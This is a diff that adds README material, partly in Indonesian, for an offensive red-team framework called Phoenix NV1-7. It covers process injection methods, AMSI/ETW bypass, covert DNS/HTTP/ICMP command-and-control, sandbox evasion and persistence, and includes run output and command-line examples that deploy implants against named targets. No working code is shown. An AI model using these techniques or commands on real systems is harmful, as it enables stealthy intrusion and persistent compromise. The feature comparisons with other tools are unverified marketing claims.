@@ -498,3 +498,496 @@ Building better defenses through understanding evasion
 <br>
 Woodlabs Security Research • 2025
 </div>
+
+----
+
+🔥🎯 #Sneak Peek: NV1-7 Core Capabilities
+
+----
+
+# VERSI TERBATAS #
+
+----
+
+<div align="center">
+# Phoenix Framework 2025 – NV1-7 (Woodlabs Edition)  
+**Next-Generation Red Team & Evasion Research Framework**
+
+[ P H O E N I X  2 0 2 5  •  W O O D L A B S  N V 1 - 7 ]
+
+Woodlabs Security Research © 2025
+
+</div>
+
+**The Upgrade Robust, fully in-memory, multi-technique evasion & post-exploitation framework.**
+
+----
+
+### Warning: This Project is for Authorized Security Testing & Research Only
+This tool implements **real offensive techniques** (Process Doppelganging, Hollowing, Direct Syscalls, D1rkSleep, AMSI/ETW bypass, multi-channel C2, etc).  
+Penggunaan tanpa izin eksplisit adalah **melanggar hukum**.
+
+----
+
+### Features (NV1-7 – All Upgrades Integrated)
+
+| Category                  | Technique Implemented                                                                 |
+|---------------------------|---------------------------------------------------------------------------------------|
+| Anti-Analysis             | Advanced Anti-Debug, Sandbox Detection (CPU/RAM/Disk/Uptime/VM artifacts), Timing checks |
+| Memory Evasion            | D1rkSleep (AES-256-CTR selective section encryption), Polymorphic Syscall Engine       |
+| Process Injection         | Process Doppelganging, Process Hollowing, Early Bird APC, Process Ghosting            |
+| Syscall Evasion           | Direct Syscalls + SSN extraction + Polymorphic stubs + Clean NTDLL from disk          |
+| String Obfuscation        | Argon2-derived ChaCha20-Poly1305 per-string encryption (zero plaintext in memory)     |
+| C2 Communication          | DNS, HTTP/S, ICMP covert channels with ChaCha20-Poly1305 encryption + jitter          |
+| AMSI / ETW Bypass         | Runtime memory patching (AmsiScanBuffer & EtwEventWrite)                               |
+| Persistence               | Registry Run keys, Scheduled Tasks                                                    |
+| OPSEC                     | Zero disk artifacts (Doppelganging), realistic HTTP headers, multi-fallback C2        |
+
+---
+
+### Sneak Peek – Core Engine (Woodlabs_Phoenix_NV1-7.py)
+
+```python
+# Phoenix Framework 2025 - Security Assessment Tool
+# Version 2.0 NV1-7 - All upgrades integrated with consistent structure
+# Copyright (c) 2025 - Woodlabs Security Research
+
+Key Highlights dari 1100+ baris kode:
+
+Polymorphic Direct Syscall Engine (HadesSyscallEngine)
+D1rkSleep Implementation (AES-256-CTR section encryption)
+4 Advanced Process Injection Techniques
+   → Process Doppelganging (transacted NTFS + section mapping)
+   → Process Hollowing (full PE parsing & relocation)
+   → Early Bird APC Queueing
+   → Process Ghosting (delete-on-close + hollowing)
+String Obfuscation via Argon2 + ChaCha20-Poly1305 (zero static strings)
+Multi-Channel C2 (DNS TXT, HTTPS, ICMP) dengan fallback otomatis
+AMSI & ETW Patch via memory write
+Advanced Anti-Debug + Sandbox Detection
+Runtime PE Shellcode Generator
+Persistence via Registry + SchTasks
+Final Report Generator (Markdown)
+```
+
+----
+
+OUTPUT
+```
+Authentication successful
+[+] Executing advanced evasion techniques...
+[+] AMSI/ETW bypass applied
+[+] C2 channel activated: http
+[+] Starting Process Doppelganging → svchost.exe
+[+] Process Doppelganging SUCCESS → PID 4892
+[+] Starting D1rkSleep for 2000ms
+[+] D1rkSleep completed
+[+] Installing persistence...
+[+] Registry persistence installed
+[+] Advanced report generated: phoenix_advanced_assessment_report.md
+
+ASSESSMENT COMPLETED SUCCESSFULLY
+```
+
+## Technical Specifications
+
+### Cryptographic Standards
+
+| Algorithm | Purpose | Mode | Key Size |
+|-----------|---------|------|----------|
+| ChaCha20-Poly1305 | AEAD Encryption | - | 256-bit |
+| AES | Memory Encryption | CTR | 256-bit |
+| HKDF | Key Derivation | SHA-256 | Variable |
+| Argon2 | KDF | Memory-hard | 256-bit |
+| SHA-256 | Hashing | - | 256-bit |
+| HMAC | Authentication | SHA-256 | 256-bit |
+
+### Memory Specifications
+
+| Component | Memory Usage | Cache Size | TTL |
+|-----------|--------------|------------|-----|
+| Nonce Tracker | Variable | 100,000 max | 3600s |
+| SSN Cache | ~2KB | Unlimited | Session |
+| Section Encryption | Per-section | Tracked | Lifetime |
+| Beacon Buffer | ~4KB | 1 active | Session |
+
+### Performance Metrics
+
+| Operation | Avg Time | Max Time | Notes |
+|-----------|----------|----------|-------|
+| Obfuscate String | 50-150ms | 250ms | Argon2 + ChaCha20 |
+| Encrypt Section | 100-500ms | 1s | Per 64KB section |
+| Syscall Execution | 1-5ms | 10ms | Direct invocation |
+| C2 Beacon | 500-2000ms | 5s | Network dependent |
+| Injection (Doppelgang) | 1-3s | 5s | Transaction overhead |
+
+### Windows API Usage
+
+| Function | Purpose | Risk Level |
+|----------|---------|------------|
+| NtCreateTransaction | Transactional file creation | HIGH |
+| NtCreateSection | Memory section mapping | HIGH |
+| NtMapViewOfSection | View mapping to process | HIGH |
+| NtAllocateVirtualMemory | Memory allocation | MEDIUM |
+| NtWriteVirtualMemory | Memory writing | MEDIUM |
+| NtQueueApcThread | APC queue injection | HIGH |
+| VirtualAlloc/Protect | Memory manipulation | MEDIUM |
+| SetFileInformationByHandle | File marking | MEDIUM |
+
+---
+
+## Comparison with Similar Tools
+
+### Feature Comparison Matrix
+
+| Feature | Phoenix Framework | Metasploit | Cobalt Strike | Sliver | Malleus |
+|---------|-------------------|-----------|----------------|--------|---------|
+| **Process Injection** | | | | | |
+| Doppelganging | ✅ | ❌ | ✅ | ✅ | ❌ |
+| Hollowing | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Early Bird APC | ✅ | ❌ | ✅ | ✅ | ❌ |
+| Ghosting | ✅ | ❌ | ❌ | ❌ | ❌ |
+| **Memory Evasion** | | | | | |
+| D1rkSleep | ✅ | ❌ | ✅ | ✅ | ❌ |
+| Polymorphic Syscalls | ✅ | ❌ | ✅ | ✅ | ✅ |
+| AMSI Bypass | ✅ | ✅ | ✅ | ✅ | ✅ |
+| ETW Bypass | ✅ | ❌ | ✅ | ✅ | ✅ |
+| **C2 Communication** | | | | | |
+| DNS Tunneling | ✅ | ✅ | ✅ | ✅ | ✅ |
+| HTTP Beaconing | ✅ | ✅ | ✅ | ✅ | ✅ |
+| ICMP Tunneling | ✅ | ❌ | ❌ | ❌ | ❌ |
+| Multi-channel Failover | ✅ | ✅ | ✅ | ✅ | ❌ |
+| **Encryption** | | | | | |
+| ChaCha20-Poly1305 | ✅ | ❌ | ✅ | ✅ | ✅ |
+| AES-256-CTR | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Argon2 KDF | ✅ | ❌ | ❌ | ❌ | ❌ |
+| String Obfuscation | ✅ | ❌ | ✅ | ✅ | ✅ |
+| **Detection Evasion** | | | | | |
+| Anti-Debug (5-layer) | ✅ | ❌ | ✅ | ✅ | ✅ |
+| Sandbox Detection | ✅ | ❌ | ✅ | ✅ | ✅ |
+| VM Detection | ✅ | ❌ | ✅ | ✅ | ✅ |
+| **Persistence** | | | | | |
+| Registry Keys | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Scheduled Tasks | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Service Installation | ✅ | ❌ | ✅ | ✅ | ❌ |
+| **Framework Features** | | | | | |
+| CLI Interface | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Modular Architecture | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Python-based | ✅ | ✅ | ❌ | ✅ | ✅ |
+| Open Source | ✅ | ✅ | ❌ | ✅ | ✅ |
+| Active Development | ✅ | ✅ | ⚠️ | ✅ | ⚠️ |
+
+### Detailed Comparison
+
+#### Metasploit Framework
+**Strengths:**
+- Most mature framework in industry
+- Extensive payload library
+- Community-driven development
+- Multi-stage payload support
+- Automatic handler infrastructure
+
+**Weaknesses:**
+- Limited advanced evasion techniques
+- No Doppelganging support
+- Basic process injection only
+- Slower execution on modern systems
+- Deprecated AMSI bypass methods
+
+**Phoenix Advantage:** Advanced memory evasion, Doppelganging, Ghosting, ICMP C2, Argon2 KDF
+
+---
+
+#### Cobalt Strike
+**Strengths:**
+- Commercial-grade reliability
+- Professional sleep mask technology
+- Excellent UI/UX
+- Mature C2 infrastructure
+- Strong post-exploitation features
+
+**Weaknesses:**
+- Expensive (requires licensing)
+- Closed-source (security through obscurity)
+- Less frequent innovation
+- Large footprint (easier to detect)
+- Requires dedicated operator training
+
+**Phoenix Advantage:** Open-source, free, Ghosting injection, ICMP C2, multi-channel automatic failover, educational transparency
+
+---
+
+#### Sliver (Open-Source Cobalt Strike Alternative)
+**Strengths:**
+- Free, open-source alternative to Cobalt Strike
+- Modern Go-based architecture
+- Comparable feature set
+- Active community development
+- Strong encryption defaults
+
+**Weaknesses:**
+- Smaller community than Metasploit
+- Less documentation available
+- Newer framework (less battle-tested)
+- Go binaries harder to customize
+- Limited Windows API flexibility
+
+**Phoenix Advantage:** Python-based flexibility, Doppelganging support, selective D1rkSleep encryption, Argon2 string obfuscation, educational-friendly
+
+---
+
+#### Malleus
+**Strengths:**
+- Specialized syscall manipulation
+- Excellent polymorphic stub generation
+- Lightweight design
+- Fast execution
+
+**Weaknesses:**
+- Single-purpose tool (not full framework)
+- No C2 infrastructure
+- Limited post-exploitation
+- No persistence mechanisms
+- Minimal documentation
+
+**Phoenix Advantage:** Complete framework, multi-channel C2, persistence, memory evasion, sandbox detection, comprehensive reporting
+
+---
+
+### Unique Phoenix Features
+
+1. **ICMP C2 Channel**
+   - Custom ICMP packet construction
+   - Direct kernel ICMP socket usage
+   - Completely covert tunneling method
+   - Available in no other mainstream tool
+
+2. **Process Ghosting**
+   - Delete-on-execute technique
+   - Zero disk footprint
+   - Unique among open-source frameworks
+   - Transaction-less alternative to Doppelganging
+
+3. **Argon2 String Obfuscation**
+   - Memory-hard KDF integration
+   - Thread-safe nonce tracking
+   - Unique per-string encryption
+   - Automatic TTL-based cleanup
+
+4. **Selective D1rkSleep**
+   - Per-section AES-256-CTR encryption
+   - Granular control over memory encryption
+   - Clean NTDLL loading with hash verification
+   - More sophisticated than simple sleep mask
+
+5. **Multi-Channel Automatic Failover**
+   - Intelligent channel switching
+   - Simultaneous DNS/HTTP/ICMP operation
+   - Jitter-based beacon interval
+   - Realistic traffic pattern generation
+
+6. **Integrated Sandbox Detection**
+   - 6-point detection methodology
+   - CPU cores analysis
+   - Disk/RAM size verification
+   - Process count evaluation
+   - VM artifact identification
+
+---
+
+## Security Considerations
+
+### For Authorized Users
+
+⚠️ **DISCLAIMER**: Phoenix Framework is provided for authorized security research and penetration testing purposes only.
+
+**Before Using:**
+1. Obtain explicit written authorization from system owner
+2. Ensure testing is within defined scope
+3. Document all activities and findings
+4. Maintain audit trail of all operations
+5. Verify legal jurisdiction and compliance requirements
+
+### OPSEC Guidelines
+
+- **Network Isolation**: Test in isolated lab environments
+- **Traffic Analysis**: Monitor beacon patterns for anomalies
+- **Log Rotation**: Manage generated artifacts securely
+- **Cleanup**: Remove persistence mechanisms after assessment
+- **Reporting**: Document all techniques and findings
+- **Attribution**: Understand potential indicators of compromise
+
+### Detection Mitigation
+
+**Recommended Defenses:**
+- EDR with behavioral analysis capabilities
+- Memory scanning for encrypted sections
+- DNS query pattern analysis
+- Anomalous process behavior monitoring
+- Registry modification auditing
+- AMSI/ETW integrity verification
+- Syscall hooking and validation
+
+---
+
+## Limitations
+
+### Technical Limitations
+
+1. **Windows-Specific Features**: Many components require Windows (D1rkSleep, syscall engine, process injection)
+2. **Privilege Requirements**: Full process injection requires elevated privileges
+3. **API Coverage**: Not all Windows APIs have SSN available in all versions
+4. **Network Dependent**: C2 requires outbound network connectivity
+5. **Memory Constraints**: Large PE files may struggle with allocation
+
+### Operational Limitations
+
+1. **AV/EDR Detection**: Advanced behavioral analysis may still detect activity
+2. **Network Detection**: DNS/HTTP/ICMP patterns may be identifiable
+3. **Disk Artifacts**: Log files and reports persist on disk
+4. **Registry Modifications**: Persistence mechanisms leave registry traces
+5. **Performance Impact**: Memory encryption has computational overhead
+
+### Maintenance Notes
+
+- Requires updates for new Windows versions (SSN changes)
+- AMSI/ETW bypass methods may require adjustment
+- C2 infrastructure must be maintained separately
+- Persistence mechanisms may be blocked by Group Policy
+- Some techniques may conflict with security software
+
+---
+
+## Advanced Usage Scenarios
+
+### Scenario 1: Red Team Engagement
+
+```bash
+# Multi-stage deployment with full evasion
+python phoenix_framework.py \
+  --target https://customer-domain.com \
+  --payload stage1.exe \
+  --technique doppelganging \
+  --process svchost.exe \
+  --c2-type all \
+  --sleep-time 3000
+```
+
+### Scenario 2: APT Simulation
+
+```bash
+# High-stealth profile with ICMP C2
+python phoenix_framework.py \
+  --target https://critical-infrastructure.com \
+  --payload aptimplant.exe \
+  --technique ghosting \
+  --process services.exe \
+  --c2-type icmp \
+  --icmp-target 10.0.0.1 \
+  --sleep-time 10000
+```
+
+### Scenario 3: Blue Team Training
+
+```bash
+# Educational assessment with DNS C2
+python phoenix_framework.py \
+  --target https://internal-training.lab \
+  --payload training-beacon.exe \
+  --technique hollowing \
+  --process explorer.exe \
+  --c2-type dns \
+  --dns-domain training.local
+```
+
+### Scenario 4: Persistence Testing
+
+```bash
+# Verify persistence mechanisms post-injection
+python phoenix_framework.py \
+  --target https://persistence-test.lab \
+  --payload persistent-implant.exe \
+  --technique earlybird \
+  --process powershell.exe
+# Inspect registry and scheduled tasks for persistence
+```
+
+---
+
+## Changelog
+
+### Version 2.0 NV1-7 (Current)
+- **Added**: Process Ghosting injection technique
+- **Added**: ICMP C2 tunneling channel
+- **Added**: Argon2 string obfuscation
+- **Added**: Selective D1rkSleep encryption
+- **Added**: Polymorphic syscall stubs
+- **Improved**: Multi-channel C2 failover logic
+- **Improved**: Sandbox detection accuracy (6-point methodology)
+- **Improved**: Anti-debugging capabilities (5-layer detection)
+- **Fixed**: Windows 11 build 22000+ SSN compatibility
+- **Fixed**: Memory leak in nonce tracker cleanup
+- **Enhanced**: Comprehensive report generation
+
+### Version 1.5
+- Core process injection techniques
+- Basic C2 communication
+- AMSI/ETW bypass
+
+### Version 1.0
+- Initial release
+- Syscall engine foundation
+- Basic evasion techniques
+
+---
+
+## Acknowledgments
+
+Phoenix Framework builds upon research and techniques pioneered by:
+- Tal Melamed (Process Doppelganging)
+- Hasherezade (Direct Syscall Execution)
+- Dreamworks Security (Memory manipulation techniques)
+- NIST (Cryptographic standards)
+- Windows security research community
+----
+
+<div align="center">
+[ P H O E N I X  2 0 2 5  •  W O O D L A B S  N V 1 - 7 ]
+</div>
+
+----
+
+
+<div align="center">
+ # Credits & Research
+
+Original concept: QurolVoV – Phoenix Evasion Research
+NV1-7 Woodlabs Edition by Woodlabs Security Research (2025)
+Techniques inspired by: hfiref0x, ajpc500, Cobbr, Outflank, SpecterOps, D1rkMtr, etc.
+<br> 
+</div>
+
+----
+
+ #Legal Disclaimer
+
+This framework is released exclusively for:
+Authorized penetration testing
+Red team operations
+Malware research & defense development
+Any unauthorized use is strictly prohibited and may violate computer misuse laws.
+
+"They won't see you coming. They won't even know you were there."
+Phoenix Framework 2025 – NV1-7
+Woodlabs Security Research © 2025
+Original research by QurolVoV.
+
+----
+
+<div align="center">
+Phoenix Rising
+<br>
+  "The phoenix doesn’t rise from the ashes it burns everything down without leaving a trace."
+<br>  
+  Woodlabs Security Research © 2025
+</div>
